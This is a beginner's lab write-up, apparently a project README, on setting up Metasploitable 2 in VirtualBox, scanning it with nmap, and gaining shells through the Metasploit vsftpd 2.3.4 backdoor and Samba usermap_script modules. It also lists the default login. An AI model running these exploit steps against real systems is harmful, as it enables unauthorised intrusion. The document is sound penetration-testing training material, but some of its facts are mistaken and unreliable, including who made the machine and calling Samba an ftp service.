# Project on  Metasploitable 2

1. what is metasploitable?

- It is vulnerable machine made by the vlunhub company which is a very well known company for creating the vulnerable machines.

- these machines are created to demonstrate the people why the cyber security is important now a days.

- why we need to secure our systems and how we can be safe in this evolving cyber world.

- when it comes to **'metasploitable 2'** It Defines about the importance various ports and why you should not keep the ports open.

- that's enough for the instruction lets start the project.

## Pre-Requisites For The Project.

1. [x] virtual box (or) VM ware.
  - you can download them from bellow links.
  - virtual box : - [virtualbox](https://www.virtualbox.org/wiki/Downloads)
  - Vm ware : - [Vmware](https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html)

2. [x] kali linux (or) Parrot Os (or) Any Other operating system virtual machine of your liking.


3. [x] Metasploitable 2
  metasploitable :- [metasploitable](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download)


## Lab Set Up.(virtual box)

1. setting up a kali linux virtual machine:-

   1. Open VirtualBox:
   
   - Launch the VirtualBox application on your computer.
   2. Click on "New":
   
   - In the VirtualBox Manager, click the "New" button to create a new virtual machine.
   3. Name and OS Type:
   
   - Enter a name for your VM, for example, "Kali Linux."
   - Choose "Linux" as the type.
   - Choose "Ubuntu" as the version.
   4. Memory Size (RAM):
   
   - Select the amount of RAM you want to allocate to the VM. In this case, set it to 6GB (6144 MB).
   5. Hard Disk:
   
   - Choose "Create a virtual hard disk now" and click "Create."
   6. Hard Disk File Type:
   
   - Choose the file type for the hard disk. The default "VDI (VirtualBox Disk Image)" is suitable.
   7. Storage on Physical Hard Disk:
   
   - Choose "Dynamically allocated" for the storage on the physical hard disk.
   8. File Location and Size:
   
   - Set the location where you want to save the VM files.
   - Set the size of the hard disk to 50GB.
   9. Create:
   
   - Click the "Create" button.
   10. Configure VM Settings:
   
   - With the new VM selected, click on "Settings."
   11. System:
   
   - In the "System" tab, uncheck the "Floppy" disk from the boot order as it's not needed.
   12. Processor:
   
   - In the "Processor" tab, you can adjust the number of processors as "2".
   13. Display:
   
   - In the "Display" tab, increase the "Screen" tab's video memory to a higher value (e.g., 128MB).
   14. Select ISO File:
   
   - In the "Storage" tab, under "Controller: IDE," click on the empty disk icon next to "Empty" under "Attributes."
   - Click on the disk icon next to "Optical Drive" and choose "Choose a disk file..."
   - Select the Kali Linux ISO file that you've downloaded.
   15. Start the VM:
   
   - Click "OK" to save the settings.
   With the VM selected, click "Start" to launch the VM.
   16. Install Ubuntu:
   
   - Follow the on-screen instructions to install Ubuntu on the VM using the ISO file.
   17. Complete the Installation:
   
   - Complete the Ubuntu installation process, including creating a user account and configuring the system

2. Setting up  the metasploitable.

   1. Open VirtualBox:
   
   - Launch the VirtualBox application on your computer.
   2. Click on "New":
   
   - In the VirtualBox Manager, click the "New" button to create a new virtual machine.
   3. Name and OS Type:
   
   - Enter a name for your VM, for example, "Metasploitable 2."
   - Choose "Linux" as the type.
   - Choose "Ubuntu" as the version.
   4. Memory Size (RAM):
   
   - Select the amount of RAM you want to allocate to the VM. In this case, set it to 1GB (1024 MB).
   5. Hard Disk:
   
   - Choose "use an existing virtual disk file" and click "folder icon and select the metasploitable 2 vdi file"
   
   - you can find that file in the extracted folder
   
   8. File Location:
   
   - Set the location where you want to save the VM files.
   
   9. Create:
   
   - Click the "Create" button.
   10. Configure VM Settings:
   
   - With the new VM selected, click on "Settings."
   11. System:
   
   - In the "Network" tab select the network type as "host only adapter."
   12. Processor:
   
   - In the "Processor" tab, you can adjust the number of processors as "1".
   13. Display:
   
   - In the "Display" tab, increase the "Screen" tab's video memory to a higher value (e.g., 128MB).
   
   15. Start the VM:
   
   - Click "OK" to save the settings.
   - With the VM selected, click "Start" to launch the VM.

### Scanning The MetaSploitable 2 Machine.

1. make sure that the metasploitable has no internet access.

2. make sure the "network settings" of the "kali linux" and "metasploitable 2" are set to "host only adapter"

3. the reason we do is that the two machines communicate with each other.

4. now start the two machines.

5. open the "kali linux" machine and open the terminal.

6. now run the following command.
```
sudo nmap -sV -sS -O 192.168.56.103(metasplotable 2 ip address) -o nmap_scan_results.txt
```

7. in the above command metasploitable IP should be given their it might be different for you.

8. you can check the IP by passing the following command on to the metasploitable 2 machine.
```
ifconfig
```

9. if you are opening the metasploitable 2 for the first time it asks to login .

10. the default credentials are
```
username: msfadmin
password: msfadmin
```

11. now you can execute the```ifconfig``` command.

12. please copy the metasploitable 2 IP address we are going to use it through out our project

13. now the nmap scan has completed successfully.

### Lets Start Exploring Each And Every Port One By One.

#### TCP Port 21 ftp

1. as the nmap scan results the port 21 is open and it is ftp and we can see the version also version "vsftpd 234"

2. ftp means file transfer protocol it is used to transfer files from devices to devices using the internet.

3. but is always a best practice to know that we have to secure that port from any other unauthorized users to it.

4. lets execute the port and see what it can shoe for us.

5. for that i am going to use metasploit.

6. to use metasploit open terminal in the "kali linux" machine.

7. now type ```msfconsole```

8. it will open metasploit for you.

9. after loading the metasploit you might see something like "ms6>"

10. now type the following
```
search vsftpd 234
```

11. it is going to give you options now select the option which has a payload of
```
exploit/unix/ftp/vsftpd_234_backdoor
```

12. now type```show options```

13. it will display the options

14. now we need to set RHOST

15. RHOST is the IP of the metasploitable 2 which we used to scan the network paste the IP in the following command
```
set RHOST metasploitable 2 IP
```

16. now all the required options have been set.

17. just click 'run' or "exploit".

18. it will do its thing and the session would be found and backdoor will be created.

19. now it successfully exploited the port.

20. now you can run any command for example whoami.

#### samba service port 139 & 445.

1. as the nmap scan results the port 139 & 445 is open and it is ftp and we can see the version as "samba 3.x"

2. for the exact version number we can go to metasploit.

3. just type```auxiliary/scanner/smb/smb_version```

4. now set the RHOSTS as metasploitable IP

5. Now type run metasploit will spill the exact version number of samba used.

6. but is always a best practice to know that we have to secure that port from any other unauthorized users to it.

7. lets execute the port and see what it can show for us.

8. for that i am going to use metasploit.

9. to use metasploit open terminal in the "kali linux" machine.

10. now type ```msfconsole```

11. it will open metasploit for you.

12. after loading the metasploit you might see something like "ms6>"

13. now type the following
```
search samba usermap_script
```

11. it is going to give you options now select the option which has a payload of
```
exploit/multi/samba/usermap_script
```

12. now type```show options```

13. it will display the options

14. now we need to set RHOST and LHOST

15. RHOST is the IP of the metasploitable 2 which we used to scan the network paste the IP in the following command
```
set RHOST metasploitable 2 IP 
set LHOST kali linux Ip
```

16. now all the required options have been set.

17. just click 'run' or "exploit".

18. it will do its thing and the session would be found and backdoor will be created.

19. now it successfully exploited the port.

20. now you can run any command for example whoami.

***maxium of the ports can be exploited by the above procewdure but some require special attendace i cannot write all the ports exploited report but i can say to practice your self***

#### Screenshots of the exploits done by me.



#### every one has their own technique of exploiting. for me this the best way feel free to do as you like it and happy hacking.

##### Thank you for reading the article, have a nice day.

